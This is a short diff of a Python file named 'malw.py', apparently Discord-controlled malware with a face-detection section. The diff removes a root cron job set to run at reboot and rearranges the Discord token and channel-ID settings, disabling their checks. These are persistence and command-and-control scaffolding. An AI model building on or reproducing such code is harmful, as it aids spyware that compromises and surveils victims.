@@ -16,12 +16,17 @@ import zipfile
 import platform
 from crontab import CronTab
 
-cron = CronTab(user='root')
-job = cron.new(command='echo hello_world')
-job.every_reboot()
+
 CURRENT_PATH = os.path.abspath(__file__).replace("malw.py","")
 
 # Discord Config
+
+TOKEN = ""
+CHANNEL_ID = ""
+# if TOKEN =="":
+#     raise Exception("Discord token not set! Please add the your discord token first by setting the variable <TOKEN> (string type)")
+# if CHANNEL_ID=="":
+#     raise Exception("Channel ID not set! Please add the your channel id first by setting the variable <CHANNEL_ID> (int type)")    
 
 def OS_Detection():
     OS = platform.system()
@@ -71,13 +76,6 @@ def OS_Detection():
         
 OS_Detection()
 
-
-TOKEN = ""
-CHANNEL_ID = ""
-if TOKEN =="":
-    raise Exception("Discord token not set! Please add the your discord token first by setting the variable <TOKEN> (string type)")
-if CHANNEL_ID=="":
-    raise Exception("Channel ID not set! Please add the your channel id first by setting the variable <CHANNEL_ID> (int type)")    
 
 ###############START#FACE#DETECTION################
 
